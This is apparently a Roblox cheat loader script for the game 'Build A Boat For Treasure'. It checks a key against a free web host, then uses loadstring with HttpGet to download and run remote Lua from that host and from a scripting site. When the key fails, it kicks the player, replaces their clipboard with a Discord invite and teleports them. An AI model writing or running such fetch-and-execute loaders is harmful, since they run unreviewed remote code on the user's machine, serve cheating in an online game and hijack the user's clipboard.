local key = _G.Key
local check = "https://best-wh-bi.000webhostapp.com/Cheak Build A Boat For Treasure.php?key=" .. key
if game:HttpGet(check) == "Whitelisted" then
loadstring(game:HttpGet("https://best-wh-bi.000webhostapp.com/Build%20A%20Boat%20For%20Treasure"))()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/anti-afk via autofocus.txt"))()
else
game.Players.LocalPlayer:Kick("Key Not Succeed")
setclipboard("https://discord.gg/ygtUarbTAw")
local ts = game:GetService("TeleportService")
local p = game:GetService("Players").LocalPlayer
ts:Teleport(game.PlaceId, p)
end
